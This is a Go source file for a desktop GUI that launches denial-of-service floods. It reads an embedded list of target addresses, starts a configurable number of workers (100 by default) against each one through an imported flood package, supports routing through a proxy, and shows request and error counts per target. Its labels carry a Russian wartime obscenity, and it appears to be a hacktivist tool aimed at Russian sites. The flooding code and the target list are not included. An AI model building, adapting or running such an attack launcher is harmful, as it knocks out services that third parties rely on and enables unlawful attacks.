package main

import (
	"context"
	"fmt"
	"strings"

	"github.com/RusskijKorablIdiNaxuj/RusskijKorablIdiNaxuj/src/flood"

	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/app"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/data/binding"
	"fyne.io/fyne/v2/theme"
	"fyne.io/fyne/v2/widget"

	_ "embed"
)

var (
	//go:embed targets/targets.txt
	text string
)

func main() {
	a := app.NewWithID("naxuj.idi.korabl.vojennyj.russkij")
	w := a.NewWindow("Русский военный корабль, иди нахуй")

	// ctx, cancel := context.WithCancel(context.Background())
	// defer cancel()

	rows := []fyne.CanvasObject{}
	targets := []*flood.Target{}
	progressVals := []binding.Float{}
	progressTexts := []binding.String{}
	progressBars := []*widget.ProgressBar{}

	for i, line := range strings.Split(string(text), "\n") {
		if strings.Trim(line, " \r\n\t") == "" {
			continue
		}
		target := flood.New(line, "")
		targets = append(targets, target)
		progressVals = append(progressVals, binding.NewFloat())
		progressTexts = append(progressTexts, binding.NewString())

		ratio := widget.NewLabelWithData(progressTexts[i])
		progress := widget.NewProgressBarWithData(progressVals[i])
		progressBars = append(progressBars, progress)
		rows = append(rows, container.NewBorder(nil, nil, widget.NewLabel(target.Name()+" иди нахуй"), ratio, progress))
	}

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	proxyOk := binding.NewBool()
	proxy := binding.NewString()
	numWorkers := binding.NewInt()

	numWorkers.Set(100)

	pCheck := widget.NewCheckWithData("Proxy", proxyOk)
	pCheck.Disable()
	pEntry := widget.NewEntryWithData(proxy)
	pEntry.PlaceHolder = "https://yourproxy:port"
	nEntry := widget.NewEntryWithData(binding.IntToString(numWorkers))
	nEntry.Validator = nil
	menu := container.NewBorder(
		nil,
		container.NewBorder(
			nil, nil,
			nil,
			pCheck,
			pEntry,
		),
		nil,
		widget.NewToolbar(
			widget.NewToolbarSeparator(),
			widget.NewToolbarAction(theme.MediaPlayIcon(), func() {
				proxySetup := false
				for _i := range targets {
					go func(i int) {
						N, _ := numWorkers.Get()
						if proxyStr, err := proxy.Get(); err == nil && proxyStr != "" {
							if err := targets[i].SetProxy(proxyStr); err == nil {
								proxySetup = true
							} else {
								proxySetup = false
							}
						}
						targets[i].Run(ctx, N, func(requests, errors int64) {
							if requests == 0 {
								progressBars[i].Max = 1
								progressVals[i].Set(1)
							} else {
								progressBars[i].Max = float64(requests)
								progressVals[i].Set(float64(errors))
							}
							progressTexts[i].Set(fmt.Sprintf("%d / %d", errors, requests))
						})
					}(_i)
				}
				proxyOk.Set(proxySetup)
			}),
		),
		container.NewAdaptiveGrid(
			2,
			container.NewBorder(
				nil, nil,
				nil,
				widget.NewLabel("Workers"),
				nEntry,
			),
		),
	)

	w.SetContent(
		container.NewBorder(menu,
			nil, nil, nil,
			container.NewVScroll(container.NewVBox(rows...)),
		),
	)
	w.Resize(fyne.NewSize(600, 1000))
	w.ShowAndRun()
}
